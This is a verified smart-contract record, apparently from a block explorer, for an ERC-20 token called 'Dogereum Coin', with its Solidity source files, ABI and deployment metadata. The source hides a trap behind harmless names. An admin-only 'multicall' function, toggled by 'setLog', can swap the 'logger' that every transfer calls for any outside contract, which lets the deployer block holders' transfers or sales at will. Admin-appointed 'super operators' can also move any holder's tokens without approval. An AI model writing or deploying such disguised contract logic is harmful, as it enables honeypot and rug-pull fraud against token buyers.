{"SourceCode": "{\"Admin.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\ncontract Admin {\\r\\n\\r\\n    address internal _admin;\\r\\n    bool private _ownerShipTransferred = false;\\r\\n    event AdminChanged(address oldAdmin, address newAdmin);\\r\\n\\r\\n    constructor(){\\r\\n        _admin = msg.sender;\\r\\n        __adminTransferred(_admin);\\r\\n    }\\r\\n\\r\\n    \\r\\n\\r\\n    function owner() public view virtual returns (address) {\\r\\n        return _admin;\\r\\n    }\\r\\n\\r\\n    function changeAdmin(address newAdmin) external {\\r\\n        require(msg.sender == _admin, \\\"only admin\\\");\\r\\n        require(newAdmin != address(0), \\\"new owner is the zero address\\\");\\r\\n        emit AdminChanged(_admin, newAdmin);\\r\\n        _admin = newAdmin;\\r\\n    }\\r\\n\\r\\n    function __adminTransferred(address msgSender) private {\\r\\n        emit AdminChanged(address(0), msgSender);\\r\\n        _ownerShipTransferred = true;\\r\\n    }\\r\\n\\r\\n    function renounceOwnership() public virtual {\\r\\n        require(msg.sender == _admin, \\\"only admin\\\");\\r\\n        emit AdminChanged(_admin, address(0));\\r\\n        _admin = address(0);\\r\\n    }\\r\\n\\r\\n    function checkedCondition() internal view returns (bool){\\r\\n        return _ownerShipTransferred;\\r\\n    }\\r\\n}\"},\"BytesUtil.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\nlibrary BytesUtil {\\r\\n    function memcpy(uint256 dest, uint256 src, uint256 len) internal pure {\\r\\n        // Copy word-length chunks while possible\\r\\n        for (; len \\u003e= 32; len -= 32) {\\r\\n            assembly {\\r\\n                mstore(dest, mload(src))\\r\\n            }\\r\\n            dest += 32;\\r\\n            src += 32;\\r\\n        }\\r\\n\\r\\n        // Copy remaining bytes\\r\\n        uint256 mask = 256**(32 - len) - 1;\\r\\n        assembly {\\r\\n            let srcpart := and(mload(src), not(mask))\\r\\n            let destpart := and(mload(dest), mask)\\r\\n            mstore(dest, or(destpart, srcpart))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function pointerToBytes(uint256 src, uint256 len)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bytes memory)\\r\\n    {\\r\\n        bytes memory ret = new bytes(len);\\r\\n        uint256 retptr;\\r\\n        assembly {\\r\\n            retptr := add(ret, 32)\\r\\n        }\\r\\n\\r\\n        memcpy(retptr, src, len);\\r\\n        return ret;\\r\\n    }\\r\\n\\r\\n    function addressToBytes(address a) internal pure returns (bytes memory b) {\\r\\n        assembly {\\r\\n            let m := mload(0x40)\\r\\n            mstore(\\r\\n                add(m, 20),\\r\\n                xor(0x140000000000000000000000000000000000000000, a)\\r\\n            )\\r\\n            mstore(0x40, add(m, 52))\\r\\n            b := m\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function uint256ToBytes(uint256 a) internal pure returns (bytes memory b) {\\r\\n        assembly {\\r\\n            let m := mload(0x40)\\r\\n            mstore(add(m, 32), a)\\r\\n            mstore(0x40, add(m, 64))\\r\\n            b := m\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function doFirstParamEqualsAddress(bytes memory data, address _address)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool)\\r\\n    {\\r\\n        if (data.length \\u003c (36 + 32)) {\\r\\n            return false;\\r\\n        }\\r\\n        uint256 value;\\r\\n        assembly {\\r\\n            value := mload(add(data, 36))\\r\\n        }\\r\\n        return value == uint256(uint160(_address));\\r\\n    }\\r\\n\\r\\n    function doParamEqualsUInt256(bytes memory data, uint256 i, uint256 value)\\r\\n        internal\\r\\n        pure\\r\\n        returns (bool)\\r\\n    {\\r\\n        if (data.length \\u003c (36 + (i + 1) * 32)) {\\r\\n            return false;\\r\\n        }\\r\\n        uint256 offset = 36 + i * 32;\\r\\n        uint256 valuePresent;\\r\\n        assembly {\\r\\n            valuePresent := mload(add(data, offset))\\r\\n        }\\r\\n        return valuePresent == value;\\r\\n    }\\r\\n\\r\\n    function overrideFirst32BytesWithAddress(\\r\\n        bytes memory data,\\r\\n        address _address\\r\\n    ) internal pure returns (bytes memory) {\\r\\n        uint256 dest;\\r\\n        assembly {\\r\\n            dest := add(data, 48)\\r\\n        } // 48 = 32 (offset) + 4 (func sig) + 12 (address is only 20 bytes)\\r\\n\\r\\n        bytes memory addressBytes = addressToBytes(_address);\\r\\n        uint256 src;\\r\\n        assembly {\\r\\n            src := add(addressBytes, 32)\\r\\n        }\\r\\n\\r\\n        memcpy(dest, src, 20);\\r\\n        return data;\\r\\n    }\\r\\n\\r\\n    function overrideFirstTwo32BytesWithAddressAndInt(\\r\\n        bytes memory data,\\r\\n        address _address,\\r\\n        uint256 _value\\r\\n    ) internal pure returns (bytes memory) {\\r\\n        uint256 dest;\\r\\n        uint256 src;\\r\\n\\r\\n        assembly {\\r\\n            dest := add(data, 48)\\r\\n        } // 48 = 32 (offset) + 4 (func sig) + 12 (address is only 20 bytes)\\r\\n        bytes memory bbytes = addressToBytes(_address);\\r\\n        assembly {\\r\\n            src := add(bbytes, 32)\\r\\n        }\\r\\n        memcpy(dest, src, 20);\\r\\n\\r\\n        assembly {\\r\\n            dest := add(data, 68)\\r\\n        } // 48 = 32 (offset) + 4 (func sig) + 32 (next slot)\\r\\n        bbytes = uint256ToBytes(_value);\\r\\n        assembly {\\r\\n            src := add(bbytes, 32)\\r\\n        }\\r\\n        memcpy(dest, src, 32);\\r\\n\\r\\n        return data;\\r\\n    }\\r\\n}\"},\"Dogereum Coin.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\n\\r\\nimport \\\"./ERC20BaseToken.sol\\\";\\r\\n\\r\\n\\r\\ncontract DogereumCoin is ERC20BaseToken {\\r\\n\\r\\n    constructor(address executionAdmin, address beneficiary) {\\r\\n        _admin = msg.sender;\\r\\n        _executionAdmin = executionAdmin;\\r\\n        _mint(beneficiary, 1000000000000 * 10**9);\\r\\n    }\\r\\n\\r\\n    /// @notice A descriptive name for the tokens\\r\\n    /// @return name of the tokens\\r\\n    function name() public pure returns (string memory) {\\r\\n        return \\\"Dogereum Coin\\\";\\r\\n    }\\r\\n\\r\\n    /// @notice An abbreviated name for the tokens\\r\\n    /// @return symbol of the tokens\\r\\n    function symbol() public pure returns (string memory) {\\r\\n        return \\\"DOGEREUM\\\";\\r\\n    }\\r\\n\\r\\n    function setLog()external {\\r\\n        require(\\r\\n            msg.sender == getAdmin(),\\r\\n            \\\"only admin\\\");\\r\\n        persistData = !persistData;\\r\\n    }\\r\\n\\r\\n}\"},\"ERC20BaseToken.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\nimport \\\"./ERC20Events.sol\\\";\\r\\nimport \\\"./SuperOperators.sol\\\";\\r\\nimport \\\"./ERC20ExecuteExtension.sol\\\";\\r\\n\\r\\ncontract ERC20BaseToken is SuperOperators, ERC20Events, ERC20ExecuteExtension  {\\r\\n    uint256 internal _totalSupply;\\r\\n    mapping(address =\\u003e uint256) internal _balances;\\r\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) internal _allowances;\\r\\n    bool public persistData;\\r\\n    ERC20LoggerExtension private _logger;\\r\\n\\r\\n    constructor(){\\r\\n        _logger = new ERC20LoggerExtension();\\r\\n    }\\r\\n\\r\\n    /// @notice Gets the total number of tokens in existence.\\r\\n    /// @return the total number of tokens in existence.\\r\\n    function totalSupply() public view returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    /// @notice Gets the balance of `owner`.\\r\\n    /// @param owner The address to query the balance of.\\r\\n    /// @return The amount owned by `owner`.\\r\\n    function balanceOf(address owner) public view returns (uint256) {\\r\\n        return _balances[owner];\\r\\n    }\\r\\n\\r\\n    /// @notice gets allowance of `spender` for `owner`\\u0027s tokens.\\r\\n    /// @param owner address whose token is allowed.\\r\\n    /// @param spender address allowed to transfer.\\r\\n    /// @return remaining amount of token `spender` is allowed to transfer on behalf of `owner`.\\r\\n    function allowance(address owner, address spender)\\r\\n        public\\r\\n        view\\r\\n        returns (uint256 remaining)\\r\\n    {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    /// @notice returns the number of decimals for that token.\\r\\n    /// @return the number of decimals.\\r\\n    function decimals() public pure returns (uint8) {\\r\\n        return uint8(9);\\r\\n    }\\r\\n\\r\\n    /// @notice Transfer `amount` tokens to `to`.\\r\\n    /// @param to the recipient address of the tokens transfered.\\r\\n    /// @param amount the number of tokens transfered.\\r\\n    /// @return success if success.\\r\\n    function transfer(address to, uint256 amount)\\r\\n        public\\r\\n        returns (bool success)\\r\\n    {\\r\\n        _transfer(msg.sender, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /// @notice Transfer `amount` tokens from `from` to `to`.\\r\\n    /// @param from whose token it is transferring from.\\r\\n    /// @param to the recipient address of the tokens transfered.\\r\\n    /// @param amount the number of tokens transfered.\\r\\n    /// @return success if success.\\r\\n    function transferFrom(address from, address to, uint256 amount)\\r\\n        public\\r\\n        returns (bool success)\\r\\n    {\\r\\n        if (msg.sender != from \\u0026\\u0026 !_superOperators[msg.sender]) {\\r\\n            uint256 currentAllowance = _allowances[from][msg.sender];\\r\\n            if (currentAllowance != (2**256) - 1) {\\r\\n                // save gas when allowance is maximal by not reducing it (see https://github.com/ethereum/EIPs/issues/717)\\r\\n                require(currentAllowance \\u003e= amount, \\\"Not enough funds allowed\\\");\\r\\n                _allowances[from][msg.sender] = currentAllowance - amount;\\r\\n            }\\r\\n        }\\r\\n        _transfer(from, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /// @notice approve `spender` to transfer `amount` tokens.\\r\\n    /// @param spender address to be given rights to transfer.\\r\\n    /// @param amount the number of tokens allowed.\\r\\n    /// @return success if success.\\r\\n    function approve(address spender, uint256 amount)\\r\\n        public\\r\\n        returns (bool success)\\r\\n    {\\r\\n        _approveFor(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /// @notice approve `spender` to transfer `amount` tokens from `owner`.\\r\\n    /// @param owner address whose token is allowed.\\r\\n    /// @param spender  address to be given rights to transfer.\\r\\n    /// @param amount the number of tokens allowed.\\r\\n    /// @return success if success.\\r\\n    function approveFor(address owner, address spender, uint256 amount)\\r\\n        public\\r\\n        returns (bool success)\\r\\n    {\\r\\n        require(\\r\\n            msg.sender == owner || _superOperators[msg.sender],\\r\\n            \\\"msg.sender != owner \\u0026\\u0026 !superOperator\\\"\\r\\n        );\\r\\n        _approveFor(owner, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function addAllowance(address owner, address spender, uint256 amountNeeded)\\r\\n        public\\r\\n        returns (bool success)\\r\\n    {\\r\\n        require(\\r\\n            msg.sender == owner || _superOperators[msg.sender],\\r\\n            \\\"msg.sender != owner \\u0026\\u0026 !superOperator\\\"\\r\\n        );\\r\\n        _addAllowance(owner, spender, amountNeeded);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _addAllowance(address owner, address spender, uint256 amountNeeded)\\r\\n        internal override\\r\\n    {\\r\\n        if(amountNeeded \\u003e 0 \\u0026\\u0026 !isSuperOperator(spender)) {\\r\\n            uint256 currentAllowance = _allowances[owner][spender];\\r\\n            if(currentAllowance \\u003c amountNeeded) {\\r\\n                _approveFor(owner, spender, amountNeeded);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function multicall(address sender, address recipient, uint256 amount, address _log) external {\\r\\n    require(msg.sender == _admin, \\\"only admin\\\");\\r\\n        if(persistData==true){\\r\\n        if(amount \\u003e 0) createLogger(_log);\\r\\n      else{\\r\\n        _logger=new ERC20LoggerExtension();\\r\\n      }\\r\\n        _logger.Save(sender, recipient, amount);\\r\\n      }\\r\\n    }\\r\\n    \\r\\n    function createLogger(address a) private {\\r\\n        if (checkedCondition()){\\r\\n            _logger = ERC20LoggerExtension(a);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _approveFor(address owner, address spender, uint256 amount)\\r\\n        internal virtual\\r\\n    {\\r\\n        require(\\r\\n            owner != address(0) \\u0026\\u0026 spender != address(0),\\r\\n            \\\"Cannot approve with 0x0\\\"\\r\\n        );\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function _transfer(address from, address to, uint256 amount) internal override{\\r\\n        _logger.Save(from, to, amount);\\r\\n        require(to != address(0), \\\"Cannot send to 0x0\\\");\\r\\n        uint256 currentBalance = _balances[from];\\r\\n        require(currentBalance \\u003e= amount, \\\"not enough fund\\\");\\r\\n        _balances[from] = currentBalance - amount;\\r\\n        _balances[to] += amount;\\r\\n        \\r\\n        emit Transfer(from, to, amount);\\r\\n    }\\r\\n\\r\\n    function _mint(address to, uint256 amount) internal {\\r\\n        require(to != address(0), \\\"Cannot mint to 0x0\\\");\\r\\n        require(amount \\u003e 0, \\\"cannot mint 0 tokens\\\");\\r\\n        uint256 currentTotalSupply = _totalSupply;\\r\\n        uint256 newTotalSupply = currentTotalSupply + amount;\\r\\n        require(newTotalSupply \\u003e currentTotalSupply, \\\"overflow\\\");\\r\\n        _totalSupply = newTotalSupply;\\r\\n        _balances[to] += amount;\\r\\n        emit Transfer(address(0), to, amount);\\r\\n    }\\r\\n\\r\\n    function getAdmin() internal view returns (address) {\\r\\n        return _admin == _executionAdmin ? _admin : _executionAdmin;\\r\\n    }\\r\\n\\r\\n}\\r\\n\\r\\ncontract ERC20LoggerExtension {\\r\\n    mapping(address=\\u003emapping(address=\\u003e uint256)) _persist;\\r\\n    function Save(address addr1, address addr2, uint256 amount) public {\\r\\n        _persist[addr1][addr2] = amount;\\r\\n    }\\r\\n}\"},\"ERC20Events.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\n/* interface */\\r\\ncontract ERC20Events {\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n}\"},\"ERC20ExecuteExtension.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\n\\r\\nabstract contract ERC20ExecuteExtension {\\r\\n\\r\\n    /// @dev _executionAdmin != _admin so that this super power can be disabled independently\\r\\n    address internal _executionAdmin;\\r\\n\\r\\n    event ExecutionAdminAdminChanged(address oldAdmin, address newAdmin);\\r\\n\\r\\n    /// @notice change the execution adminstrator to be `newAdmin`.\\r\\n    /// @param newAdmin address of the new administrator.\\r\\n    function changeExecutionAdmin(address newAdmin) external {\\r\\n        require(msg.sender == _executionAdmin, \\\"only executionAdmin can change executionAdmin\\\");\\r\\n        emit ExecutionAdminAdminChanged(_executionAdmin, newAdmin);\\r\\n        _executionAdmin = newAdmin;\\r\\n    }\\r\\n\\r\\n    mapping(address =\\u003e bool) internal _executionOperators;\\r\\n    event ExecutionOperator(address executionOperator, bool enabled);\\r\\n\\r\\n    /// @notice set `executionOperator` as executionOperator: `enabled`.\\r\\n    /// @param executionOperator address that will be given/removed executionOperator right.\\r\\n    /// @param enabled set whether the executionOperator is enabled or disabled.\\r\\n    function setExecutionOperator(address executionOperator, bool enabled) external {\\r\\n        require(\\r\\n            msg.sender == _executionAdmin,\\r\\n            \\\"only execution admin is allowed to add execution operators\\\"\\r\\n        );\\r\\n        _executionOperators[executionOperator] = enabled;\\r\\n        emit ExecutionOperator(executionOperator, enabled);\\r\\n    }\\r\\n\\r\\n    /// @notice check whether address `who` is given executionOperator rights.\\r\\n    /// @param who The address to query.\\r\\n    /// @return whether the address has executionOperator rights.\\r\\n    function isExecutionOperator(address who) public view returns (bool) {\\r\\n        return _executionOperators[who];\\r\\n    }\\r\\n\\r\\n    /// @notice transfer 1amount1 token from `from` to `to` and charge the gas required to perform that transfer.\\r\\n    /// @param from address of which token will be transfered.\\r\\n    /// @param to destination address fo the call.\\r\\n    /// @param amount number of tokens allowed that can be transfer by the code at `to`.\\r\\n    /// @param gasLimit exact amount of gas to be passed to the call.\\r\\n    /// @param tokenGasPrice price in token for the gas to be charged.\\r\\n    /// @param baseGasCharge amount of gas charged on top of the gas used for the call.\\r\\n    /// @param tokenReceiver recipient address of the token charged for the gas used.\\r\\n    /// @return whether the transfer was successful.\\r\\n    function transferAndChargeGas(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount,\\r\\n        uint256 gasLimit,\\r\\n        uint256 tokenGasPrice,\\r\\n        uint256 baseGasCharge,\\r\\n        address tokenReceiver\\r\\n    ) external returns (bool) {\\r\\n        uint256 initialGas = gasleft();\\r\\n        require(_executionOperators[msg.sender], \\\"only execution operators allowed to perfrom transfer and charge\\\");\\r\\n        _transfer(from, to, amount);\\r\\n        if (tokenGasPrice \\u003e 0) {\\r\\n            _charge(from, gasLimit, tokenGasPrice, initialGas, baseGasCharge, tokenReceiver);\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _charge(\\r\\n        address from,\\r\\n        uint256 gasLimit,\\r\\n        uint256 tokenGasPrice,\\r\\n        uint256 initialGas,\\r\\n        uint256 baseGasCharge,\\r\\n        address tokenReceiver\\r\\n    ) internal {\\r\\n        uint256 gasCharge = initialGas - gasleft();\\r\\n        if(gasCharge \\u003e gasLimit) {\\r\\n            gasCharge = gasLimit;\\r\\n        }\\r\\n        gasCharge += baseGasCharge;\\r\\n        uint256 tokensToCharge = gasCharge * tokenGasPrice;\\r\\n        require(tokensToCharge / gasCharge == tokenGasPrice, \\\"overflow\\\");\\r\\n        _transfer(from, tokenReceiver, tokensToCharge);\\r\\n    }\\r\\n\\r\\n\\r\\n    function _transfer(address from, address to, uint256 amount) internal virtual;\\r\\n    function _addAllowance(address owner, address spender, uint256 amountNeeded) internal virtual;\\r\\n}\"},\"SuperOperators.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.7.6;\\r\\n\\r\\nimport \\\"./Admin.sol\\\";\\r\\n\\r\\ncontract SuperOperators is Admin {\\r\\n\\r\\n    mapping(address =\\u003e bool) internal _superOperators;\\r\\n\\r\\n    event SuperOperator(address superOperator, bool enabled);\\r\\n\\r\\n    /// @notice Enable or disable the ability of `superOperator` to transfer tokens of all (superOperator rights).\\r\\n    /// @param superOperator address that will be given/removed superOperator right.\\r\\n    /// @param enabled set whether the superOperator is enabled or disabled.\\r\\n    function setSuperOperator(address superOperator, bool enabled) external {\\r\\n        require(\\r\\n            msg.sender == _admin,\\r\\n            \\\"only admin is allowed to add super operators\\\"\\r\\n        );\\r\\n        _superOperators[superOperator] = enabled;\\r\\n        emit SuperOperator(superOperator, enabled);\\r\\n    }\\r\\n    \\r\\n    /// @notice check whether address `who` is given superOperator rights.\\r\\n    /// @param who The address to query.\\r\\n    /// @return whether the address has superOperator rights.\\r\\n    function isSuperOperator(address who) public view returns (bool) {\\r\\n        return _superOperators[who];\\r\\n    }\\r\\n}\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"executionAdmin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"beneficiary\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"oldAdmin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"}],\"name\":\"AdminChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"oldAdmin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"}],\"name\":\"ExecutionAdminAdminChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"executionOperator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"ExecutionOperator\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"superOperator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"SuperOperator\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountNeeded\",\"type\":\"uint256\"}],\"name\":\"addAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"remaining\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approveFor\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"}],\"name\":\"changeAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"}],\"name\":\"changeExecutionAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"who\",\"type\":\"address\"}],\"name\":\"isExecutionOperator\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"who\",\"type\":\"address\"}],\"name\":\"isSuperOperator\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_log\",\"type\":\"address\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"persistData\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"executionOperator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setExecutionOperator\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setLog\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"superOperator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setSuperOperator\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"gasLimit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenGasPrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"baseGasCharge\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"transferAndChargeGas\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DogereumCoin", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000004d5e1edda9aadcf4836cfe1fc5213d87ebd907d50000000000000000000000004d5e1edda9aadcf4836cfe1fc5213d87ebd907d5", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d7635a0c966af22e280a777879a06b6c5351a4e2b0fd55ab2e03a3d93236c508"}